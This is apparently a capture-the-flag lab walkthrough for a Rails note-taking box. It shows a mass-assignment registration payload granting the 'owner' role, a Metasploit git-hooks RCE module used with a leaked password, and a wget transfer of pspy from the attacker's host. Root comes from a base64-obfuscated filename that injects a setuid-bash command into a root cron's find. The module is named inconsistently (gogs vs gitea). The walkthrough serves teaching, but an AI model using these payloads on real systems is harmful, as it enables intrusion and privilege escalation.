## Enumeration

We start the enumeration process with an `nmap` scan:

```
┌──(kali㉿kali)-[~]
└─$ nmap  192.168.58.126  -vv
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-20 18:21 CEST
Initiating ARP Ping Scan at 18:21
Scanning assignment.pg (192.168.58.126) [1 port]
Completed ARP Ping Scan at 18:21, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:21
Scanning assignment.pg (192.168.58.126) [65535 ports]
Discovered open port 80/tcp on 192.168.58.126
Discovered open port 22/tcp on 192.168.58.126
Completed SYN Stealth Scan at 18:21, 0.81s elapsed (65535 total ports)
Nmap scan report for assignment.pg (192.168.58.126)
Host is up, received arp-response (0.00011s latency).
Scanned at 2022-05-20 18:21:39 CEST for 1s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:02:A5:DF (Oracle VirtualBox virtual NIC)
```

The output reveals a webserver running on port `80`. Visual inspection shows a note taking page:

![home](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_1_KJ3W18Nd.png)

home

Using curl , we see that the site tries to set `_simple_rails_session` so we can assume it is built on the Ruby on Rails framework.

```
┌──(kali㉿kali)-[~]
└─$ curl -I 192.168.58.126
HTTP/1.1 200 OK
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Link: </packs/js/application-0a98d1e1abc2fd44621c.js>; rel=preload; as=script; nopush
Content-Type: text/html; charset=utf-8
Vary: Accept
ETag: W/"0006d5403546a154e99c7ccec35b0394"
Cache-Control: max-age=0, private, must-revalidate
Set-Cookie: _simple_rails_session=dE2IUpzYPPgTKMgrZPFQwd7IWq2YBHCufeO7J7jIjoxotC3%2BosTFGGgt8ojIdhuA2quf5%2BfCvTBNTD70L%2B15EVsPbzxfTXFT4ACIlInN%2FiYu8XuBEgIZfL9IQcUY2HtGsF%2BjQZgiKHZnLJXUkHazFzyBJ6XJMM86C2CZtOegx%2F%2FCGn27MsW5kWRHa39O05qwF9ZDNWgGgUTKFA0gTPDy2Ra81UjfCzfQRIuKI5XvrByUMIZUkSaAq%2B6Hf339zQNRkkfZHIPqUfB%2F8AQxfJIguVHmfsNSgFWTl9qCdLc%3D--QI%2FcVEoc3n6gJu%2BT--52XyBUw3Z4tEY7r406c%2FRA%3D%3D; path=/; HttpOnly; SameSite=Lax
```

We next create an account and log into the application, to explore more functionality.

![reg](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_2_Xn7K3DrW.png.png)

reg

We are provided with a couple of functions. We first checkout the Members link, which leads us to the registered users:

![users](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_3_KmN81LeR.png.png)

users

We saw jane in the contact form on the landing page, so we can assume she created the application. We click on the link and notice her role differs from the others:

![role](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_4_KlQe2RK1.png.png)

role

In contrast our profile looks like this:

![role2](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_5_L4RaVc31.png)

role2

We next create a note, and see that we can access it at http://assignment.pg/notes/5, so we conclude that there are 4 other notes, which might contain sensitive information. However when trying to access these, we get an error:

![error](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_6_LP3xQ8En.png)

error

MVC frameworks allow developers to automatically bind request parameters into attributes of objects to ease the development. This can sometimes cause harm if the input of the user is not validated properly. In this case we see a third attribute of a user called `role` that we can escalate access by setting `role` to `owner`.

For this, we send the following payload when trying to register a user:

```
authenticity_token=oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ&user[username]=forged_owner&user[role]=owner&user[password]=forged_owner&user[password_confirmation]=forged_owner&button=
```

Checking the users page, we see that we are now owner.

![owner](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_7_Ka3xFK9Q.png.png)

owner

We can also access the 4 notes now. Checking all out, we get credentials from note 1:

![creds](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_132_image_9_MnC5H7Lq.png)

creds

With these, we can authenticate to `gogs` where we have admin rights, and see that git hooks are enabled.

After doing some research online we see that we are able to exploit gog's git hooks functionality for our initial foothold.

We can use the msf module `multi/http/gogs_git_hooks_rce` for this task, which should give us a shell as jane back.

```
msf6 exploit(multi/http/gitea_git_hooks_rce) > options

Module options (exploit/multi/http/gitea_git_hooks_rce):

   Name       Current Setting            Required  Description
   ----       ---------------            --------  -----------
   PASSWORD   svc-dev2022@@@!;P;4SSw0Rd  yes       Password to use
   Proxies                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.201.52              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      8000                       yes       The target port (TCP)
   SSL        false                      no        Negotiate SSL/TLS for outgoing connections
   SSLCert                               no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                          yes       Base path
   URIPATH                               no        The URI to use for this exploit (default is random)
   USERNAME   jane                       yes       Username to authenticate with
   VHOST                                 no        HTTP server virtual host
```

# Privilege Esclation

We can use a tool called [`pspy`](https://github.com/DominicBreuker/pspy) and run it in order to monitor processes.

We begin by downloading `pspy` to our attack machine.

```
┌──(kali㉿kali)-[~]
└─$ git clone https://github.com/DominicBreuker/pspy.git  
Cloning into 'pspy'...
remote: Enumerating objects: 1109, done.
remote: Counting objects: 100% (83/83), done.
remote: Compressing objects: 100% (52/52), done.
remote: Total 1109 (delta 37), reused 59 (delta 28), pack-reused 1026
Receiving objects: 100% (1109/1109), 9.29 MiB | 4.19 MiB/s, done.
Resolving deltas: 100% (489/489), done.
```

Now we set up a webserver on our attack machine.

```
──(kali㉿kali)-[/pspy]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.120.79 - - [07/Jun/2022 12:55:23] "GET /pspy HTTP/1.1" 200 -
```

We transfer `pspy` onto the target machine with the following command

```
jane@assignment:/tmp$ wget http://192.168.118.25/pspy
wget http://192.168.118.25/pspy
--2022-16-08 19:55:22--  http://192.168.118.25/pspy
Connecting to 192.168.118.25:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4532312 (4.3M) [application/octet-stream]
Saving to: 'pspy'
```

Running `pspy` we see a cron running as root.

```
....
2022/08/22 18:33:42 CMD: UID=0    PID=1      | /sbin/init maybe-ubiquity 
2022/08/22 18:34:01 CMD: UID=0    PID=2146   | /usr/sbin/CRON -f 
2022/08/22 18:34:01 CMD: UID=0    PID=2148   | /bin/bash /usr/bin/clean-tmp.sh 
2022/08/22 18:34:01 CMD: UID=0    PID=2147   | /bin/sh -c /bin/bash /usr/bin/clean-tmp.sh 
2022/08/22 18:34:01 CMD: UID=0    PID=2149   | /bin/bash /usr/bin/clean-tmp.sh 
...
```

We identify a command injection in the way the script uses `find`.

```
jane@assignment:~$ cat /usr/bin/clean-tmp.sh 
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;
```

Reading the manpage of `find`, we notice:

```
-exec command ;
              Execute command; true if 0 status is returned.  All following arguments to find are taken to be arguments to the command until an argument consisting of `;' is encountered.
              The  string  `{}'  is replaced by the current file name being processed everywhere it occurs in the arguments to the command, not just in arguments where it is alone, as in
              some versions of find.  Both of these constructions might need to be escaped (with a `\') or quoted to protect them from expansion by the shell.  See the  EXAMPLES  section
              for  examples  of  the use of the -exec option.  The specified command is run once for each matched file.  The command is executed in the starting directory.  There are un‐
              avoidable security problems surrounding use of the -exec action; you should use the -execdir option instead.
```

We send the following command.

```
jane@assignment:/tmp$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA==|base64 -d|bash)'
```

Waiting a few seconds, we can get root through `bash -p`.

```
jane@assignment:/tmp$ bash -p
bash-5.0# whoami
root
```